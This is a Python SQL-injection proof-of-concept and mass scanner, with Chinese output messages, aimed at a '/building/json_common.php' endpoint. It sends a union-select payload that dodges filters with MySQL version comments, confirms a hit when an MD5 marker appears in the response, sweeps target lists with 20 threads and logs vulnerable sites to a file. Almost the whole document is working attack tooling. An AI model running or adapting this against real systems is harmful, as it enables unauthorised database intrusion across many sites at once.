import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Cookie": "LOGIN_LANG=cn; PHPSESSID=bd702adc830fba4fbcf5f336471aeb2e",
    "DNT": "1",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "79",
    }   
def poc(url):
    payload = '/building/json_common.php'
    target = url+payload
    data = 'tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,MD5(1) ,4#|2|333'
    try:
        rsp = requests.get(url=url,verify=False)
        if rsp.status_code == 200:
            rsp2 = requests.post(url=target,headers=headers,data=data,verify=False)
            if 'c4ca4238a0b923820dcc509a6f75849' in rsp2.text:
                print(f"[+]{url}存在sql注入")
                with open('./result.txt','a',encoding="utf-8") as f:
                    f.write(url+'\n')
            else:
                print(f"[-]{url}不存在sql注入")
        else:
            print(f"[-]{url}不存在sql注入")
    except Exception as e:
        print("该站点有问题")
def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
if __name__ == '__main__':
    main()